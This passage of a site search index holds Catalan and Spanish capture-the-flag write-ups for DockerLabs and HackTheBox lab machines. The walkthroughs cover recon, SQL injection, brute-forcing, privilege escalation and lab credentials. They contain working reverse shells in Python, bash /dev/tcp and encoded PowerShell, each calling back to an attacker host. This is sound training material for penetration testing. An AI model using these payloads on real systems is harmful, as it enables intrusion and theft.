21:44</p>"},{"location":"Writeup-ctfs/DockerLabs/ShowTime/#reconocimiento","title":"Reconocimiento","text":"<p>NMAP </p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports\n</code></pre> <p></p> <pre><code>sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted\n</code></pre> <p></p> <p>Ports:</p> <p>22 SSH: Open SSH 9.61 80 http: Apache 2.4.58</p> <p>FUZZING </p> <pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py\n</code></pre> <p></p> <p>Trobem /login_page/</p>"},{"location":"Writeup-ctfs/DockerLabs/ShowTime/#analisis-de-vulnerabilidades","title":"An\u00e1lisis de vulnerabilidades","text":"<p>Web Analisis </p> <p></p> <p>Probem les SQL Injection:</p> <p>Usuario: ' OR 1=1-- Password: 1234</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/ShowTime/#explotacion-de-vulnerabilidades","title":"Explotaci\u00f3n de vulnerabilidades","text":"<p>SQLMAP </p> <pre><code>sqlmap -u \"[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)\" --forms --batch\n\n- `u \"&lt;http://172.17.0.2/login_page/index.php&gt;\"`:\n    - Esta opci\u00f3n especifica la URL del objetivo que sqlmap va a analizar, en este caso, la p\u00e1gina `index.php` ubicada en `http://172.17.0.2/login_page/`.\n- `-forms`:\n    - Esta opci\u00f3n indica a `sqlmap` que debe analizar todos los formularios presentes en la p\u00e1gina web. Los formularios pueden contener campos de entrada que podr\u00edan ser vulnerables a inyecciones SQL. `sqlmap` detectar\u00e1 estos formularios, los rellenar\u00e1 con datos potencialmente maliciosos, y probar\u00e1 si son susceptibles a una inyecci\u00f3n SQL.\n- `batch`:\n    - Esta opci\u00f3n le dice a `sqlmap` que ejecute en modo no interactivo, es decir, sin solicitar confirmaciones del usuario durante la ejecuci\u00f3n. Esto es \u00fatil para automatizar la tarea y evitar que `sqlmap` pregunte sobre cada paso que normalmente requerir\u00eda confirmaci\u00f3n (como si quieres seguir adelante con una inyecci\u00f3n peligrosa o explorar bases de datos despu\u00e9s de descubrir una vulnerabilidad).\n</code></pre> <pre><code>sqlmap -u \"[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)\" --forms --batch --dbs\n\n    - `dbs`:Per a veure les bases de dades\n</code></pre> <p></p> <pre><code> sqlmap -u \"[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)\" --forms --batch -D users --tables\n  -`D`:\n  -`tables`:Per a veure les taules e la BS users\n</code></pre> <p></p> <pre><code>sqlmap -u \"[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)\" --forms --batch -D users -T usuarios --dump\n - `T`:\n-`dump`: Per a volcar el contingut de la taula usuarios\n</code></pre> <p></p> <p>Entrem a la web amb els 3 i el que es difrente es el usuari \"joe\"</p> <p></p> <p>Busquem com executar una revershell en python:</p> <pre><code>import socket\nimport subprocess\nimport os\n\n# Direcci\u00f3n IP del atacante (listener)\nATTACKER_IP = \"IP_NOSTRE\"\n# Puerto en el que el atacante est\u00e1 escuchando\nATTACKER_PORT = 4444\n\n# Crear un socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Conectarse al servidor de la m\u00e1quina atacante\ns.connect((ATTACKER_IP, ATTACKER_PORT))\n\n# Redirigir la entrada y salida est\u00e1ndar\nos.dup2(s.fileno(), 0)  # stdin\nos.dup2(s.fileno(), 1)  # stdout\nos.dup2(s.fileno(), 2)  # stderr\n\n# Ejecutar un shell\nsubprocess.call([\"/bin/sh\", \"-i\"])\n</code></pre> <p>Ens posem en escolta :</p> <pre><code>sudo nc -lvnp 4444\n</code></pre> <p>Tenim la Rever shell:</p> <p></p> <p>Tractament TTY:</p> <pre><code>script /dev/null -c bash\nCTRL + Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=bash\n</code></pre>"},{"location":"Writeup-ctfs/DockerLabs/ShowTime/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>usuari :www-data </p> <p></p> <p>Provem a escalar privilegis:</p> <pre><code>sudo -l : no funciona, ens demana password\n</code></pre> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null:\n</code></pre> <p></p> <p>Al no trobar res, mirem altres usuaris:</p> <p></p> <p>Busquem fitxers a l'equip i trobem a la carpeta /tmp</p> <p></p> <p>Obrirm .hidden_text.txt</p> <p></p> <p>Com tenim diferents usuaris (joe, luciano) provem a buscar amb hydra el password d'aquest utilitzant aquesta llista com a diccionari:</p> <pre><code>john --wordlist=passwords.txt --rules --stdout &gt; wordlist_variada.txt\n</code></pre> <p>Copiem el llistat al fitxer \"pass.txt\" i el passem amb el john a passVariado</p> <pre><code> john --wordlist=pass.txt --rules --stdout &gt;passVariado.txt\n</code></pre> <p>I amb Hydra:</p> <pre><code>hydra -l joe -P passVariado.txt 172.17.0.2 ssh -Vv\n</code></pre> <p>Resultat:</p> <p></p> <p>Usuari: joe</p> <p>Password: chi**g</p> <p>Ara , dins de la maquina, canviem a usuari <code>joe</code></p> <pre><code>su joe\n</code></pre> <p></p> <p>Mirem com podem escalar privilegis amb usuari \"Joe\"</p> <pre><code>Sudo -l\n</code></pre> <p>Podem executar posh sense password com a luciano:</p> <pre><code>sudo -u luciano /bin/posh\n</code></pre> <p></p> <p>Ara som usuari luciano</p> <p>busquem permisos:</p> <pre><code>sudo -l\n</code></pre> <p>Veiem que el script te permisos de escriptura</p> <pre><code>ls -l\n-rw-rw-r-- 1 luciano luciano  122 Aug 21 17:11 script.sh\n</code></pre> <p>Modifiquem el script:</p> <pre><code>echo \"/bin/bash\" &gt;&gt; script.sh\nsudo /bin/bash /home/luciano/script.sh\n</code></pre> <p>Esperem perque el script porta un deleyy i despres:</p> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Trust/","title":"Trust","text":"<p>\ud83e\udde0 Plataforma: Dockerlabs</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 4 de diciembre de 2024 21:12</p> <p>\ud83c\udf10 IP: <code>172.17.0.2</code></p>"},{"location":"Writeup-ctfs/DockerLabs/Trust/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":""},{"location":"Writeup-ctfs/DockerLabs/Trust/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Trust/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22</li> <li>80</li> </ul> <p>Fuzzing :</p> <pre><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x php,txt\n</code></pre> <p>Encontramos ruta : secret.php</p> <p></p> </li> </ul>"},{"location":"Writeup-ctfs/DockerLabs/Trust/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"Writeup-ctfs/DockerLabs/Trust/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Al tener un usuario en la web y el puerto 22 abierto, probamos a bruteforcear el password con hydra:</p> <pre><code>hydra -l mario -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -v\n</code></pre> <p></p> <p>Obtenemos password :</p> <p>Usuario: mario</p> <p>Password: c*e</p>"},{"location":"Writeup-ctfs/DockerLabs/Trust/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Accedemos por ssh con usuario y password. Buscamos binarios SUID</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>Buscamos como explotar el binaro en GTFObins: vim</p> <pre><code>sudo vim -c ':!/bin/sh'\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Trust/#conclusion","title":"Conclusi\u00f3n","text":"<p>Enumeramos la maquina y con un fuzzing simple, encontramos pagina que nos da una pista de un posible usuario. Encontramos la contrase\u00f1a por fuerza bruta y escalamos privilegios explotando el binario VIM</p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/","title":"Upload","text":"<p>\ud83e\udde0 Plataforma: Dockerlabs</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 4 de diciembre de 2024 21:01</p> <p>\ud83c\udf10 IP: <code>172.17.0.2</code></p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":""},{"location":"Writeup-ctfs/DockerLabs/Upload/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports\n</code></pre> <p>Open port: 80</p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>80 / HTTP</li> </ul> <p>Whatweb :</p> <p></p> <p>Fuzzing : </p> <pre><code>gobuster dir -u 172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x txt,php\n</code></pre> <p></p> </li> </ul> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"Writeup-ctfs/DockerLabs/Upload/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Upload reverse shell PentestMonkey via web</p> <pre><code>sudo nc -lvnp 443\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Buscamos binarios SUID:</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>Buscamos en GTFOBins como explotar el binario \u201cenv\u201d</p> <pre><code>sudo env /bin/sh\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/Upload/#conclusion","title":"Conclusi\u00f3n","text":"<p>Enumeraci\u00f3n b\u00e1sica de la maquina, con un servicio vulnerable. Explotaci\u00f3n via File Upload.</p> <p>Escalada de privilegios senzilla exploando binario ENV</p>"},{"location":"Writeup-ctfs/DockerLabs/Walking%20CMS/","title":"Walking CMS","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:36</p>"},{"location":"Writeup-ctfs/DockerLabs/Walking%20CMS/#nmap","title":"NMAP","text":"<pre><code>sudo nmap -p- -sS -vvv  -n -Pn 172.17.0.2 -oG allports\n</code></pre> <p>Gobuster per trobar directoris :</p> <pre><code>gobuster dir -u [http://172.17.0.2](http://172.17.0.2/) -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p></p> <p>Es un wordpress. Enumerem usuaris :</p> <pre><code>sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) --enumerate u\n</code></pre> <p></p> <p>Usuari : mario</p> <p>Busquem password amb :</p> <pre><code>sudo wpscan --url [http://172.17.0.2/wordpress](http://172.17.0.2/wordpress) -P /usr/share/wordlists/rockyou.txt\n</code></pre> <p></p> <p>Password: l***</p> <p>Entrem al wp-admin amb les credencials entrem al editor de themes i creem un nou com a test.php amb la webshell:</p> <p></p> <p>Ens posen a l'espera i executem la webshell:</p> <p></p> <p>Mire fitxer wp-config.php</p> <p>Database: username: wordpressuser</p> <p>Data base password: t****S</p> <p>Tractament TTY:</p> <pre><code>script /dev/null -c bash\nCTRL + Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=bash\n</code></pre> <p>Busquem permisos:</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p>Explotem env:</p> <pre><code>env /bin/sh -p\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/DockerLabs/WhereIsMyShell/","title":"WhereIsMyShell","text":"<p>Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:28</p>"},{"location":"Writeup-ctfs/DockerLabs/WhereIsMyShell/#reconeixement","title":"Reconeixement","text":""},{"location":"Writeup-ctfs/DockerLabs/WhereIsMyShell/#nmap","title":"NMAP","text":"<pre><code>sudo nmap -p- -sS --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports\n</code></pre>"},{"location":"Writeup-ctfs/DockerLabs/WhereIsMyShell/#fuzzing","title":"FUZZING","text":"<pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py\n</code></pre> <p>/Warning.htm</p> <p></p> <p>Fem fuzzing per trobar el parametre per executar la web shell:</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \"[http://172.17.0.2/shell.php?FUZZ=key](http://172.17.0.2/shell.php?FUZZ=key)\" -fs 0\n</code></pre> <p>resultat: parameter</p> <p>executem webshell per veure que hi ha al  /tmp</p> <p></p> <p>Encodejem la url:</p> <pre><code>ls -la /tmp : ls%20-la%20%2Ftmp\ncat /tmp/.secret.txt = cat%20%2Ftmp%2F.secret.txt\n</code></pre> <p></p> <p>Obtenim una rever shell:</p> <pre><code>http://172.17.0.2/shell.php?parameter=bash&gt; -c \"bash -i &gt;%26 /dev/tcp/IP ATACANT/443 0&gt;%261\"\n</code></pre> <pre><code># bash -c es per executar la ordre i el \"bash -i &gt;%26 /dev/tcp/IP ATACANT/443 0&gt;%261\" es la rever\nRever: bash -i &gt;&amp; /dev/tcp/192.168.208.128/443 0&gt;&amp;1\nEncode el &amp;:\n\"bash -i &gt;%26 /dev/tcp/IP ATACANT/443 0&gt;%261\"\n</code></pre> <p>Tractament tty</p> <p>Utilitzem la contrasenya que hem trobat de root:</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/","title":"Archetype","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 22 de diciembre de 2024 15:44</p> <p>\ud83c\udf10 IP: <code>10.129.51.6</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Identificamos sistema con Wichsystem : </p> <pre><code>whichsystem.py 10.129.51.6\n\n10.129.51.6 (ttl -&gt; 127): Windows\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.129.51.6 -oG targeted\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p135,139,445,1433,5985,47001,49664,49666,49667,49668,49669 -sCV 10.129.51.6 -oN allports\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <pre><code>PORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds\n1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM\n|_ssl-date: 2024-12-22T14:53:45+00:00; 0s from scanner time.\n| ms-sql-info: \n|   10.129.51.6:1433: \n|     Version: \n|       name: Microsoft SQL Server 2017 RTM\n|       number: 14.00.1000.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ms-sql-ntlm-info: \n|   10.129.51.6:1433: \n|     Target_Name: ARCHETYPE\n|     NetBIOS_Domain_Name: ARCHETYPE\n|     NetBIOS_Computer_Name: ARCHETYPE\n|     DNS_Domain_Name: Archetype\n|     DNS_Computer_Name: Archetype\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2024-12-22T14:45:00\n|_Not valid after:  2054-12-22T14:45:00\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s\n| smb-os-discovery: \n|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)\n|   Computer name: Archetype\n|   NetBIOS computer name: ARCHETYPE\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-12-22T06:53:20-08:00\n| smb2-time: \n|   date: 2024-12-22T14:53:27\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 99.25 seconds\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>SMB : 139</p> <pre><code>smbclient -L //10.129.51.6 -N\n</code></pre> <pre><code>harename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    backups         Disk      \n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n</code></pre> <p>Enumeramos recurso \u201cbackups\u201d</p> <pre><code>smbclient //10.129.51.6/backups\nsmb: \\&gt; dir\n  .                                   D        0  Mon Jan 20 13:20:57 2020\n  ..                                  D        0  Mon Jan 20 13:20:57 2020\n  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020\n</code></pre> <p>Descargamos fichero y revisamos contenido:</p> <pre><code>smb: \\&gt; get prod.dtsConfig \nsmb: \\&gt; !ls\nallports  prod.dtsConfig  targeted\nsmb: \\&gt; !cat \n# ! sirve para verificar acceder a los archivos en local\n</code></pre> <pre><code>&lt;DTSConfiguration&gt;\n    &lt;DTSConfigurationHeading&gt;\n        &lt;DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/&gt;\n    &lt;/DTSConfigurationHeading&gt;\n    &lt;Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"&gt;\n        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;\n    &lt;/Configuration&gt;\n</code></pre> <p>User: sql_svc</p> <p>Password:  M3g4c0rp123</p> <p>Probamos a conectarnos mediante impacket con las credenciales obtenidas:</p> <pre><code>impacket-mssqlclient -port 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.51.6 -windows-auth\n</code></pre> <p>Una vez conecatados, tratamos de enumerar las bases de datos:</p> <pre><code>SQL (ARCHETYPE\\sql_svc  dbo@master)&gt; enum_db\nname     is_trustworthy_on   \n------   -----------------   \nmaster                   0   \n\ntempdb                   0   \n\nmodel                    0   \n\nmsdb                     1  \n\n# Activamos la ejecucion de comandos: \n\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; enable_xp_cmdshell\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.\n\n# verificamos que funciona \n\nSQL (ARCHETYPE\\sql_svc  dbo@master)&gt; xp_cmdshell whoami\noutput              \n-----------------   \narchetype\\sql_svc\n</code></pre> <p>Ejecutamos una rever shell para establecer conexion con nuestro pc:</p> <pre><code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n</code></pre> <p>Quedando:</p> <pre><code># En maquina atacante\nsudo nc -lvnp 444\n</code></pre> <pre><code># Reverese shell en base64\n\nxp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n</code></pre> <p>Una vez obtenemos la rever, probamos a enumerar privilegios con WinPEAS:</p> <pre><code>PS C:\\&gt; mkdir prova\nPS C:\\prova&gt; Invoke-WebRequest -Uri \"http://10.10.16.33:8000/winPEAS.ps1\" -OutFile \"C:\\prova\\winpeas.ps1\"\nPS C:\\prova&gt; ./winpeas.ps1\n</code></pre> <p>El resultado de winPeas nos muestra un fichero:</p> <pre><code>PS C:\\Windows\\system32&gt; type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\nnet.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!\nexit\nPS C:\\Windows\\system32&gt; \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<pre><code> sudo impacket-psexec administrator:MEGACORP_4dm1n\\!\\!@10.129.226.164\n Impacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Requesting shares on 10.129.226.164.....\n[*] Found writable share ADMIN$\n[*] Uploading file znLxsoks.exe\n[*] Opening SVCManager on 10.129.226.164.....\n[*] Creating service iWnV on 10.129.226.164.....\n[*] Starting service iWnV.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.2061]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; cd ..\n\nC:\\Windows&gt; cd ..\n\nC:\\&gt; whoami\nnt authority\\system\n\nC:\\Users\\Administrator&gt; cd Desktop\n\nC:\\Users\\Administrator\\Desktop&gt; dir\n Volume in drive C has no label.\n Volume Serial Number is 9565-0B4F\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n07/27/2021  01:30 AM    &lt;DIR&gt;          .\n07/27/2021  01:30 AM    &lt;DIR&gt;          ..\n02/25/2020  06:36 AM                32 root.txt\n               1 File(s)             32 bytes\n               2 Dir(s)  10,741,542,912 bytes free\n\nC:\\Users\\Administrator\\Desktop&gt; type root.txt\nb91ccec3305e98240082d4474b848528\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Archetype/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 En esta secci\u00f3n, debes proporcionar un resumen de la m\u00e1quina para cuando tengas que volver a ella, puedas saber conocer de forma r\u00e1pida de 